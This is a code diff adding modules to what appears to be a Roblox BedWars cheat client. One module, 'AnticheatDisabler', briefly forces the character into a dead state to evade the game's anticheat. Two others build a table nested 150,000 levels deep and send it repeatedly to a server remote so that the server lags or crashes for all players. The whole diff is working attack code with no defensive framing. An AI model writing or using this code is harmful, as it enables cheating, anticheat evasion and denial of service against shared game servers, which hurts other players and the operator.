@@ -1,0 +1,98 @@
+runcode(function()
+	local Disabler = {["Enabled"] = false}
+	Disabler = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "AnticheatDisabler",
+		["Function"] = function(callback)
+			if callback then
+				if WhitelistFunctions:IsSpecialIngame() then 
+					createwarning("Disabler", "no", 10)
+					Disabler["ToggleButton"](false)
+					return
+				end
+				if (matchState == 0 or lplr.Character:FindFirstChildWhichIsA("ForceField")) then
+					task.spawn(function()
+						entity.character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+						entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+						repeat task.wait() until entity.character.Humanoid.MoveDirection ~= Vector3.zero
+						task.wait(0.2)
+						entity.character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+						entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
+						workspace.Gravity = 192.6
+						createwarning("AnticheatDisabler", "Disabled Anticheat!", 10)
+					end)
+				else
+					local warning = createwarning("AnticheatDisabler", "Failed to disable\ndo it on respawn bubble or spawnbox", 10)
+					pcall(function()
+						warning:GetChildren()[5].Position = UDim2.new(0, 46, 0, 38)
+					end)
+				end
+				Disabler["ToggleButton"](false)
+			end
+		end
+	})
+end)
+
+runcode(function()
+	local trollage
+	local remote = bedwars["ClientHandler"]:Get(bedwars["PickupRemote"])
+	local ServerCrasher = {["Enabled"] = false}
+	ServerCrasher = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "LagbackAllLoop",
+		["Function"] = function(callback)
+			if callback then
+				if WhitelistFunctions:IsSpecialIngame() then 
+					createwarning("LagbackAllLoop", "no", 10)
+					ServerCrasher["ToggleButton"](false)
+					return
+				end
+				task.spawn(function()
+					if not trollage then 
+						trollage = {}
+						local lasttbl
+						for i = 1,150000 do
+							trollage[#trollage+1] = (lasttbl or {})
+							lasttbl = trollage[#trollage]
+						end
+					end
+					repeat
+						task.wait(0.3)
+						task.spawn(function() 
+							pcall(function() remote:CallServer(trollage) end)
+						end)
+					until (not ServerCrasher["Enabled"])
+				end)
+			end
+		end
+	})
+	local ServerCrasher2 = {["Enabled"] = false}
+	ServerCrasher2 = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "LagbackAll",
+		["Function"] = function(callback)
+			if callback then
+				if WhitelistFunctions:IsSpecialIngame() then 
+					createwarning("LagbackAllLoop", "no", 10)
+					ServerCrasher2["ToggleButton"](false)
+					return
+				end
+				task.spawn(function()
+					if not trollage then 
+						trollage = {}
+						local lasttbl
+						for i = 1,150000 do
+							trollage[#trollage+1] = (lasttbl or {})
+							lasttbl = trollage[#trollage]
+						end
+					end
+					for i = 1, 15 do 
+						task.wait(0.3)
+						task.spawn(function() 
+							pcall(function() remote:CallServer(trollage) end)
+						end)
+					end
+				end)
+				ServerCrasher2["ToggleButton"](false)
+			end
+		end
+	})
+end)
+
